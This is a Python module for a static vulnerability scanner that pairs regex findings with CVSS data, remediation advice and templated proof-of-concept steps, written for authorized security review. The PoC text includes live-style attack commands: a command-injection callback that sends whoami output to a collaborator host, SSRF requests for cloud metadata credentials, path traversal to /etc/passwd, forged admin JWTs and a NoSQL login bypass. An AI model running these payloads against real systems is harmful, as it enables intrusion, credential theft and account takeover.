"""Heuristic vulnerable-code signals for one-shot repository scans.

Each signal carries a CVSS v3.1 vector, remediation guidance and a deterministic
proof-of-concept builder. These are *candidates* found by static review: the PoC
is a reproduction recipe to be exercised against an authorized environment.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Callable

SNIPPET_LIMIT = 240

SKIP_FINDING_PARTS = {
    "node_modules",
    "vendor",
    "dist",
    "build",
    "coverage",
    ".next",
    "__pycache__",
    "venv",
    ".venv",
    "site-packages",
    "test",
    "tests",
    "__tests__",
    "spec",
    "fixtures",
    "mocks",
    "examples",
    "samples",
    "docs",
}


@dataclass(frozen=True)
class SignalDef:
    rule_id: str
    title: str
    severity: str
    cvss: str
    cwe: str
    owasp: str
    summary: str
    root_cause: str
    impact: str
    remediation: str
    pattern: re.Pattern | None
    poc: Callable[[dict], str]
    secret: bool = False


def _route(ctx: dict) -> dict | None:
    return ctx.get("route")


def _concrete_path(route: dict | None) -> str:
    path = (route or {}).get("path") or "/<reachable-path>"
    for name in (route or {}).get("params") or []:
        path = re.sub(r"\{[^{}]*" + re.escape(name) + r"[^{}]*\}", "1", path)
        path = re.sub(r"<[^<>]*" + re.escape(name) + r"[^<>]*>", "1", path)
        path = re.sub(r":" + re.escape(name) + r"\b", "1", path)
    return path


def _curl(ctx: dict, suffix: str = "", method: str | None = None) -> str:
    route = _route(ctx)
    verb = method or (route or {}).get("method") or "GET"
    return f"curl -s -X {verb} '<TARGET>{_concrete_path(route)}{suffix}'"


def _where(ctx: dict) -> str:
    route = _route(ctx)
    if route:
        return (
            f"Declared as `{route['method']} {route['path']}` in "
            f"`{ctx['file']}:{ctx['line']}`."
        )
    return f"Sink located at `{ctx['file']}:{ctx['line']}`."


def _evidence(ctx: dict) -> str:
    return f"```\n{ctx['snippet']}\n```"


def _finish() -> str:
    return (
        "\n\n> Run these steps only against a target you are authorized to test, "
        "then attach the request/response pair to the report."
    )


# ---------------------------------------------------------------------------
# proof-of-concept builders
# ---------------------------------------------------------------------------


def poc_private_key(ctx: dict) -> str:
    return (
        f"1. The archive ships private key material at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Copy the key out of the repository and try it against the service's host:\n\n"
        "```bash\n"
        "chmod 600 ./recovered.key\n"
        "curl -s --key ./recovered.key --cert ./recovered.crt '<TARGET>/'\n"
        "```\n\n"
        "3. If it is an SSH key, test it directly:\n\n"
        "```bash\nssh -i ./recovered.key <user>@<TARGET-host>\n```\n\n"
        "4. Confirm the credential authenticates, then rotate it and purge it from the "
        "repository history." + _finish()
    )


def poc_aws_key(ctx: dict) -> str:
    return (
        f"1. The access key id below is committed at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Pair it with the matching secret (usually the next line or an adjacent config "
        "file) and check the identity it belongs to:\n\n"
        "```bash\n"
        "export AWS_ACCESS_KEY_ID='<AKIA... from the line above>'\n"
        "export AWS_SECRET_ACCESS_KEY='<matching secret>'\n"
        "aws sts get-caller-identity\n"
        "aws s3 ls\n"
        "```\n\n"
        "3. Record the account id, readable buckets and any permission the key has, then "
        "report the exposure and request rotation." + _finish()
    )


def poc_jwt_secret(ctx: dict) -> str:
    return (
        f"1. The JWT signing secret is a literal at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Mint a token for an arbitrary user id with that secret:\n\n"
        "```bash\n"
        "python3 - <<'PY'\n"
        "import time, jwt\n"
        "secret = '<literal from the line above>'\n"
        "print(jwt.encode({'sub': '1', 'role': 'admin', 'exp': int(time.time()) + 3600},\n"
        "                 secret, algorithm='HS256'))\n"
        "PY\n"
        "```\n\n"
        "3. Send the forged token to a protected route:\n\n"
        f"```bash\n{_curl(ctx)} -H 'Authorization: Bearer <forged-token>'\n```\n\n"
        "4. If the request fails only because of the role claim, adjust `sub`/`role` until "
        "it returns another account's data — that is full account takeover."
        + _finish()
    )


def poc_generic_secret(ctx: dict) -> str:
    return (
        f"1. A credential literal is committed at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Use it against the service (API key header) or the provider it belongs to:\n\n"
        "```bash\n"
        f"{_curl(ctx)} -H 'Authorization: Bearer <value from the line above>'\n"
        "```\n\n"
        "```bash\n"
        "# provider keys\n"
        "curl -s -H 'Authorization: Bearer <value>' https://api.github.com/user\n"
        "```\n\n"
        "3. Confirm the credential is live and what it can reach, then report it for "
        "rotation." + _finish()
    )


def poc_env_file(ctx: dict) -> str:
    return (
        f"1. The repository ships a committed `.env` file (`{ctx['file']}`) with these "
        f"keys: `{ctx['snippet']}`.\n\n"
        "2. Read the values from the archive and reuse them against the deployed service:\n\n"
        "```bash\n"
        "set -a; source ./.env; set +a\n"
        f"{_curl(ctx, '', 'GET')} -H \"Authorization: Bearer ${{API_TOKEN:-$TOKEN}}\"\n"
        "```\n\n"
        "3. Any database URL, signing key or third-party token in that file is exposed to "
        "everyone with repository access — verify one is live, then request rotation and "
        "move secrets out of version control." + _finish()
    )


def poc_sqli(ctx: dict) -> str:
    route = _route(ctx)
    param = (route or {}).get("params", ["id"])[0] if route else "id"
    return (
        f"1. Baseline the request. {_where(ctx)}\n\n"
        f"```bash\n{_curl(ctx)}\n```\n\n"
        "2. Send a boolean probe in each string parameter:\n\n"
        "```bash\n"
        f"{_curl(ctx, f'?{param}=1%27%20OR%20%271%27%3D%271')}\n"
        "```\n\n"
        "3. Confirm and enumerate with sqlmap:\n\n"
        "```bash\n"
        f"sqlmap -u '<TARGET>{_concrete_path(route)}?{param}=1' --batch --level 3 --risk 2 --dbs\n"
        "```\n\n"
        "4. Once injection is confirmed, extract one table to prove impact (users or "
        "sessions first)." + _finish()
    )


def poc_command_injection(ctx: dict) -> str:
    route = _route(ctx)
    param = (route or {}).get("params", ["format"])[0] if route else "format"
    return (
        f"1. Baseline the endpoint. {_where(ctx)}\n\n"
        f"```bash\n{_curl(ctx)}\n```\n\n"
        "2. Append a shell separator to the tainted parameter:\n\n"
        "```bash\n"
        f"{_curl(ctx, f'?{param}=csv%3Bid')}\n"
        "```\n\n"
        "3. If output is suppressed, use an out-of-band callback:\n\n"
        "```bash\n"
        f"{_curl(ctx, f'?{param}=csv%3Bcurl%20https%3A%2F%2F<your-collaborator>%2F%24(whoami)')}\n"
        "```\n\n"
        "4. A shell prompt or callback proves remote command execution as the service user."
        + _finish()
    )


def poc_eval(ctx: dict) -> str:
    route = _route(ctx)
    param = (route or {}).get("params", ["input"])[0] if route else "input"
    return (
        f"1. Baseline. {_where(ctx)}\n\n"
        f"```bash\n{_curl(ctx)}\n```\n\n"
        "2. Submit an expression that evaluates to a marker value:\n\n"
        "```bash\n"
        f"{_curl(ctx, f'?{param}=7*7')}\n"
        "```\n\n"
        "3. Escalate to the host once evaluation is confirmed (read a file or run a "
        "process, matching the language of the sink)." + _finish()
    )


def poc_deserialization(ctx: dict) -> str:
    return (
        f"1. The sink deserializes attacker-reachable data. {_where(ctx)}\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Build a benign payload that proves deserialization happens (Python):\n\n"
        "```bash\n"
        "python3 - <<'PY'\n"
        "import pickle, base64\n"
        "print(base64.b64encode(pickle.dumps({'probe': 'dap'})).decode())\n"
        "PY\n"
        "```\n\n"
        "3. Send it to the route that reads the serialized value, then use a gadget chain "
        "(ysoserial for Java, pickle opcodes for Python) only after confirming the format."
        + _finish()
    )


def poc_tls_disabled(ctx: dict) -> str:
    return (
        f"1. The client disables certificate verification at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Intercept its traffic through a proxy with a self-signed certificate:\n\n"
        "```bash\n"
        "mitmproxy -p 8080\n"
        "HTTPS_PROXY=http://127.0.0.1:8080 python ./the-client.py\n"
        "```\n\n"
        "3. A completed handshake through the intercepting proxy proves the client accepts "
        "any certificate, which enables credential and token theft on the network path."
        + _finish()
    )


def poc_weak_hash(ctx: dict) -> str:
    return (
        f"1. Passwords are hashed with a fast primitive at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Recover a value from a test account or a leaked dump and crack it:\n\n"
        "```bash\n"
        "echo '<hash>' > hash.txt\n"
        "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n"
        "```\n\n"
        "3. A recovered password proves the primitive is unusable for credential storage."
        + _finish()
    )


def poc_debug(ctx: dict) -> str:
    return (
        f"1. Debug mode is enabled at `{ctx['file']}:{ctx['line']}`:\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Reach the interactive debugger on the deployed service:\n\n"
        "```bash\n"
        "curl -s '<TARGET>/console'\n"
        "curl -s '<TARGET>/__debugger__?cmd=resource&f=style.css' | head\n"
        "```\n\n"
        "3. If the debugger renders, derive the Werkzeug PIN from the leaked machine "
        "details, or trigger an exception page to confirm the traceback leak."
        + _finish()
    )


def poc_cors(ctx: dict) -> str:
    route = _route(ctx)
    return (
        f"1. The CORS policy allows any origin (`{ctx['file']}:{ctx['line']}`):\n\n"
        f"{_evidence(ctx)}\n\n"
        "2. Ask for the response headers with a hostile origin:\n\n"
        "```bash\n"
        f"{_curl(ctx, '', 'GET')} -H 'Origin: https://evil.example' -i | grep -i 'access-control'\n"
        "```\n\n"
        "3. If `Access-Control-Allow-Credentials: true` comes back, a page on the hostile "
        "origin can read authenticated responses:\n\n"
        "```js\n"
        f"fetch('<TARGET>{_concrete_path(route)}', {{ credentials: 'include' }})\n"
        "  .then(r => r.text()).then(console.log)\n"
        "```\n"
        "4. Confirm the browser returns data, not a CORS error." + _finish()
    )


def poc_open_redirect(ctx: dict) -> str:
    return (
        f"1. The redirect target comes from the request. {_where(ctx)}\n\n"
        "2. Redirect to a host you control:\n\n"
        "```bash\n"
        f"{_curl(ctx, '?next=https://evil.example/landing', 'GET')} -i\n"
        "```\n\n"
        "3. A `Location: https://evil.example/landing` header proves the redirect accepts "
        "external hosts; combine it with an OAuth or login flow for credential phishing."
        + _finish()
    )


def poc_traversal(ctx: dict) -> str:
    return (
        f"1. A file path is built from request data. {_where(ctx)}\n\n"
        "2. Walk out of the intended directory:\n\n"
        "```bash\n"
        f"{_curl(ctx, '?file=../../../../etc/passwd', 'GET')}\n"
        "```\n\n"
        "3. `root:x:0:0` in the response proves arbitrary file read; try the application "
        "config and `.env` next." + _finish()
    )


def poc_ssrf(ctx: dict) -> str:
    return (
        f"1. The server fetches a URL supplied by the request. {_where(ctx)}\n\n"
        "2. Point it at the cloud metadata endpoint:\n\n"
        "```bash\n"
        f"{_curl(ctx, '?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'GET')}\n"
        "```\n\n"
        "3. If the body returns metadata, the instance role credentials are readable.\n\n"
        "4. Also try internal services (`http://127.0.0.1:6379`, `http://10.0.0.1`) and "
        "an out-of-band collaborator URL to confirm the request originates server-side."
        + _finish()
    )


def poc_nosql(ctx: dict) -> str:
    return (
        f"1. A query operator from the request reaches the datastore. {_where(ctx)}\n\n"
        "2. Send an operator instead of a scalar:\n\n"
        "```bash\n"
        f"{_curl(ctx, '', 'POST')} -H 'Content-Type: application/json' \\\n"
        "  -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'\n"
        "```\n\n"
        "3. A successful login without valid credentials proves operator injection."
        + _finish()
    )


# ---------------------------------------------------------------------------
# signals
# ---------------------------------------------------------------------------

SIGNALS: list[SignalDef] = [
    SignalDef(
        rule_id="dap.crypto.private-key-committed",
        title="Private key committed to the repository",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="798",
        owasp="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
        summary="A PEM private key is stored in the repository, so anyone with read access to the code or a build artifact can impersonate the service it protects.",
        root_cause="Key material was committed instead of being generated per environment and kept in a secret store.",
        impact="Traffic decryption, service impersonation, or SSH access depending on what the key protects.",
        remediation="Rotate the key pair, remove it from history, and load the replacement from a secret manager or KMS.",
        pattern=re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"),
        poc=poc_private_key,
        secret=True,
    ),
    SignalDef(
        rule_id="dap.cloud.aws-access-key",
        title="AWS access key committed in source",
        severity="critical",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe="798",
        owasp="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        summary="A long-lived AWS access key id is committed, and its secret usually sits beside it. The pair grants whatever IAM policy the key carries.",
        root_cause="Static cloud credentials were used for local development and then committed.",
        impact="Access to S3 buckets, databases, queues or the whole account depending on the key's policy.",
        remediation="Disable and rotate the key in IAM, switch workloads to roles/instance profiles, and add secret scanning to CI.",
        pattern=re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
        poc=poc_aws_key,
        secret=True,
    ),
    SignalDef(
        rule_id="dap.jwt.hardcoded-secret",
        title="Hardcoded JWT signing secret",
        severity="critical",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe="798",
        owasp="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        summary="JWTs are signed or verified with a literal secret in source. Anyone who can read the code can mint tokens for any user, including administrators.",
        root_cause="The signing secret is a constant instead of a per-environment secret loaded at runtime.",
        impact="Authentication bypass and account takeover across every session the service issues.",
        remediation="Rotate the secret, load it from a secret manager, and invalidate existing tokens by rotating the signing key id.",
        pattern=re.compile(
            r"(?:jwt\.(?:sign|verify)\([^)\n]{0,200}?['\"][A-Za-z0-9_\-+/=]{10,}['\"])"
            r"|(?:(?:jwt[_-]?secret|jwt[_-]?key|signing[_-]?key)\s*[:=]\s*['\"][^'\"]{8,}['\"])",
            re.IGNORECASE,
        ),
        poc=poc_jwt_secret,
        secret=True,
    ),
    SignalDef(
        rule_id="dap.secrets.hardcoded-credential",
        title="Hardcoded credential in source",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="798",
        owasp="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        summary="A password, API key or token is assigned as a string literal. The value is readable in git history and any build artifact.",
        root_cause="The value was inlined for convenience instead of read from configuration or a secret store.",
        impact="Direct access to whatever the credential protects, from a third-party API to the application database.",
        remediation="Rotate the credential, load it from the environment or a secret manager, and add pre-commit secret scanning.",
        pattern=re.compile(
            r"\b(?:api[_-]?key|apikey|client[_-]?secret|secret[_-]?key|access[_-]?token"
            r"|auth[_-]?token|password|passwd|private[_-]?key)\b\s*[:=]\s*['\"][^'\"]{10,}['\"]",
            re.IGNORECASE,
        ),
        poc=poc_generic_secret,
        secret=True,
    ),
    SignalDef(
        rule_id="dap.sqli.string-built-query",
        title="SQL injection via a string-built query",
        severity="critical",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe="89",
        owasp="https://owasp.org/Top10/A03_2021-Injection/",
        summary="Request data is concatenated into a SQL statement (or passed to a raw query helper), so attacker input becomes query syntax.",
        root_cause="The query is assembled with string concatenation or interpolation instead of parameter binding.",
        impact="Read or modify any table the application user can reach, often including password hashes and sessions.",
        remediation="Use parameterized queries or the ORM's bind parameters everywhere; never concatenate request data into SQL.",
        pattern=re.compile(
            r"(?:['\"][^'\"\n]*(?:SELECT|INSERT|UPDATE|DELETE)[^'\"\n]*['\"]\s*\+)"
            r"|(?:\+\s*(?:req\.(?:query|params|body)|request\.(?:args|form|json)))"
            r"|(?:(?:\.raw|\.execute|\.query)\(\s*(?:`[^`]*\$\{|['\"][^'\"]*['\"]\s*\+|f['\"][^'\"]*\{))",
            re.IGNORECASE,
        ),
        poc=poc_sqli,
    ),
    SignalDef(
        rule_id="dap.cmdi.shell-invocation",
        title="Command injection through a shell invocation",
        severity="critical",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe="78",
        owasp="https://owasp.org/Top10/A03_2021-Injection/",
        summary="A shell command is built from request data or executed with `shell=True`, so shell metacharacters run as the service user.",
        root_cause="Untrusted input reaches a command string, or the process is spawned through a shell that interprets it.",
        impact="Remote command execution on the application host, typically full compromise of the container or instance.",
        remediation="Avoid shells: use argument arrays with an allowlist, and never interpolate request data into a command string.",
        pattern=re.compile(
            r"(?:(?:exec|execSync|spawnSync|os\.system|subprocess\.(?:run|call|check_output|Popen)"
            r"|Runtime\.getRuntime\(\)\.exec)\s*\(\s*(?:`[^`]*\$\{|f['\"][^'\"]*\{|['\"][^'\"]*['\"]\s*\+))"
            r"|(?:shell\s*=\s*True)",
        ),
        poc=poc_command_injection,
    ),
    SignalDef(
        rule_id="dap.code.eval-of-request-data",
        title="Dynamic code evaluation of request data",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        cwe="95",
        owasp="https://owasp.org/Top10/A03_2021-Injection/",
        summary="User input is passed to eval, new Function or exec, so the request body is executed as code.",
        root_cause="A dynamic evaluation primitive is used where parsing or a lookup table was needed.",
        impact="Code execution with the privileges of the process — read secrets, pivot to internal services, or persist.",
        remediation="Remove the evaluation primitive; parse the input against a schema or dispatch through an explicit map.",
        pattern=re.compile(
            r"(?:\beval\(|\bnew Function\(|\bexec\()\s*"
            r"(?:req\.|request\.|params|input\b|body\b|code\b|query\b|user_?input)",
            re.IGNORECASE,
        ),
        poc=poc_eval,
    ),
    SignalDef(
        rule_id="dap.deserialization.unsafe",
        title="Unsafe deserialization of untrusted data",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe="502",
        owasp="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
        summary="A native deserializer (pickle, yaml.load without SafeLoader, unserialize) processes input that can originate from a request.",
        root_cause="A data format with code-execution gadgets is used for untrusted input.",
        impact="Remote code execution through a gadget chain, or object injection into application state.",
        remediation="Use a data-only format (JSON) with schema validation, or a safe loader such as yaml.SafeLoader.",
        pattern=re.compile(
            r"(?:pickle\.loads\(|yaml\.load\((?!\s*[^)]*SafeLoader)|marshal\.loads\("
            r"|unserialize\(|node-serialize|ObjectInputStream)"
        ),
        poc=poc_deserialization,
    ),
    SignalDef(
        rule_id="dap.tls.verification-disabled",
        title="TLS certificate verification disabled",
        severity="medium",
        cvss="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="295",
        owasp="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
        summary="The HTTP client skips certificate verification, so any on-path attacker can impersonate the upstream service.",
        root_cause="Verification was disabled to work around a local certificate problem and shipped to production.",
        impact="Credential, token and API response theft on the network path between services.",
        remediation="Re-enable verification and trust the internal CA explicitly instead of disabling validation.",
        pattern=re.compile(
            r"(?:verify\s*=\s*False|rejectUnauthorized\s*:\s*false"
            r"|NODE_TLS_REJECT_UNAUTHORIZED\s*[=:]\s*['\"]?0|InsecureSkipVerify\s*:\s*true)"
        ),
        poc=poc_tls_disabled,
    ),
    SignalDef(
        rule_id="dap.crypto.weak-password-hash",
        title="Weak password hashing primitive",
        severity="medium",
        cvss="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="916",
        owasp="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
        summary="A fast hash (MD5/SHA1) is used for password storage, so a leaked database cracks quickly on commodity hardware.",
        root_cause="The wrong primitive was chosen for credential storage instead of a memory-hard password hash.",
        impact="Recovered plaintext passwords and credential stuffing against other services.",
        remediation="Migrate to argon2id or bcrypt, rehash on next login, and invalidate existing hashes.",
        pattern=re.compile(
            r"(?:hashlib\.(?:md5|sha1)\(|createHash\(\s*['\"](?:md5|sha1)['\"]"
            r"|MessageDigest\.getInstance\(\s*['\"](?:MD5|SHA-?1)['\"]|\b(?:md5|sha1)\s*\()"
        ),
        poc=poc_weak_hash,
    ),
    SignalDef(
        rule_id="dap.config.debug-enabled",
        title="Application debug mode enabled",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="489",
        owasp="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        summary="The application starts with debug mode on, which exposes stack traces and, for Flask/Werkzeug, an interactive console.",
        root_cause="A development default is used in the deployed configuration.",
        impact="Source and secret disclosure through tracebacks; interactive console can escalate to code execution.",
        remediation="Disable debug in every deployed environment and fail startup if it is enabled.",
        pattern=re.compile(
            r"(?:app\.run\([^)]*debug\s*=\s*True|\.debug\s*=\s*True|^\s*DEBUG\s*=\s*True)",
            re.MULTILINE,
        ),
        poc=poc_debug,
    ),
    SignalDef(
        rule_id="dap.cors.permissive-origin",
        title="Permissive CORS policy",
        severity="medium",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        cwe="942",
        owasp="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        summary="The service reflects or allows any origin in CORS, so a hostile page can call authenticated endpoints from the victim's browser.",
        root_cause="The CORS policy uses a wildcard instead of an explicit allowlist of first-party origins.",
        impact="Cross-origin reads of authenticated data when credentials are allowed.",
        remediation="Allowlist exact first-party origins and never combine wildcard origins with credentials.",
        pattern=re.compile(
            r"(?:Access-Control-Allow-Origin['\"]?\s*[,:]\s*['\"]\*['\"]"
            r"|origin\s*:\s*['\"]\*['\"])"
        ),
        poc=poc_cors,
    ),
    SignalDef(
        rule_id="dap.redirect.open",
        title="Open redirect from request data",
        severity="medium",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        cwe="601",
        owasp="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        summary="A redirect target is taken from the request without an allowlist, so the service can be used to land users on an attacker host.",
        root_cause="The redirect location is not validated against first-party destinations.",
        impact="Credential phishing on a trusted domain and OAuth token leakage when redirect URIs are trusted.",
        remediation="Resolve redirect targets against an allowlist of relative paths or verified hosts.",
        pattern=re.compile(
            r"(?:redirect|sendRedirect|RedirectResponse)\(\s*"
            r"(?:req\.|request\.|params|query|url|next|return_to)",
            re.IGNORECASE,
        ),
        poc=poc_open_redirect,
    ),
    SignalDef(
        rule_id="dap.traversal.path-from-request",
        title="Path traversal in a file operation",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe="22",
        owasp="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        summary="A filename from the request is passed to a file read or send helper, so `../` sequences escape the intended directory.",
        root_cause="The path is joined without normalising and constraining it to a fixed root.",
        impact="Read of configuration, secrets and source outside the upload directory.",
        remediation="Resolve the final path and verify it stays inside the intended root; prefer generated ids over filenames.",
        pattern=re.compile(
            r"(?:send_file|sendFile|readFile(?:Sync)?|open|createReadStream)\(\s*"
            r"(?:req\.|request\.|path\.join\([^)]*req\.)",
            re.IGNORECASE,
        ),
        poc=poc_traversal,
    ),
    SignalDef(
        rule_id="dap.ssrf.request-supplied-url",
        title="Server-side request forgery from a request URL",
        severity="high",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        cwe="918",
        owasp="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery/",
        summary="The server fetches a URL supplied by the request, so it can be pointed at internal services and cloud metadata.",
        root_cause="Egress targets come from the caller instead of a fixed allowlist of destinations.",
        impact="Access to metadata credentials, internal admin APIs and internal network scanning.",
        remediation="Allowlist destinations, resolve and block private/link-local ranges, and disable redirects.",
        pattern=re.compile(
            r"(?:requests\.(?:get|post)|axios\.(?:get|post)|fetch|urlopen|http\.Get)\(\s*"
            r"(?:req\.|request\.|params\[|body\.|url\b|target\b)",
            re.IGNORECASE,
        ),
        poc=poc_ssrf,
    ),
    SignalDef(
        rule_id="dap.nosql.operator-injection",
        title="NoSQL operator injection",
        severity="medium",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        cwe="943",
        owasp="https://owasp.org/Top10/A03_2021-Injection/",
        summary="A request object is passed into a NoSQL query, so operators such as `$ne` reach the datastore instead of a scalar value.",
        root_cause="The query filter accepts arbitrary request objects without type checking.",
        impact="Authentication bypass and unauthorised reads of stored documents.",
        remediation="Coerce expected fields to strings/ints and reject object-shaped input.",
        pattern=re.compile(r"(?:\$where\s*:|\$ne\s*:\s*(?:req\.|request\.))"),
        poc=poc_nosql,
    ),
]

ENV_FILE_RULE = SignalDef(
    rule_id="dap.secrets.env-file-committed",
    title="Environment file committed to the repository",
    severity="high",
    cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cwe="538",
    owasp="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
    summary="A `.env` file is tracked in version control, exposing every credential inside it to anyone with repository access.",
    root_cause="Local environment configuration was committed instead of ignored.",
    impact="Database URLs, signing keys and third-party tokens are all readable from the archive.",
    remediation="Remove the file from the repository and history, rotate every value it contained, and commit a `.env.example` instead.",
    pattern=None,
    poc=poc_env_file,
    secret=True,
)

_PLACEHOLDER = re.compile(
    r"(?:process\.env|os\.environ|os\.getenv|getenv\(|\$\{|<[^>]+>|\bexample\b"
    r"|\bdummy\b|\bplaceholder\b|\byour[_-]|\bxxxx|\*{4,})",
    re.IGNORECASE,
)


LOCK_FILES = {
    "package-lock.json",
    "yarn.lock",
    "pnpm-lock.yaml",
    "composer.lock",
    "poetry.lock",
    "cargo.lock",
    "go.sum",
}

SECRET_ONLY_EXTENSIONS = (".json", ".sql", ".xml")


def _ignored_for_findings(path: str) -> bool:
    lowered = path.lower()
    name = lowered.rsplit("/", 1)[-1]
    if lowered.endswith((".min.js", ".min.css", ".map", ".sarif")):
        return True
    if name in LOCK_FILES or name.endswith(".sarif.json"):
        return True
    parts = lowered.split("/")
    return any(part in SKIP_FINDING_PARTS for part in parts[:-1])


def scan_text(path: str, content: str) -> list[dict]:
    """Return candidate hits for one file: [{rule, file, line, snippet}]."""
    name = path.rsplit("/", 1)[-1]
    if name == ".env":
        keys = []
        for line in content.splitlines():
            match = re.match(r"\s*([A-Za-z_][A-Za-z0-9_]*)\s*=", line)
            if match:
                keys.append(match.group(1))
        return [
            {
                "rule": ENV_FILE_RULE,
                "file": path,
                "line": 1,
                "snippet": ", ".join(keys[:12]) or "(empty file)",
                "route": None,
            }
        ]

    if _ignored_for_findings(path):
        return []

    secret_only = path.lower().endswith(SECRET_ONLY_EXTENSIONS)
    hits: list[dict] = []
    for number, line in enumerate(content.splitlines(), 1):
        if len(line) > 3000:
            continue
        stripped = line.strip()
        if len(stripped) < 6:
            continue
        comment = stripped.startswith(("//", "#", "*", "/*"))
        for rule in SIGNALS:
            if rule.pattern is None:
                continue
            if secret_only and not rule.secret:
                continue
            if comment and not rule.secret:
                continue
            if rule.secret and _PLACEHOLDER.search(line):
                continue
            if rule.pattern.search(line):
                hits.append(
                    {
                        "rule": rule,
                        "file": path,
                        "line": number,
                        "snippet": stripped[:SNIPPET_LIMIT],
                        "route": None,
                    }
                )
                break
    return hits
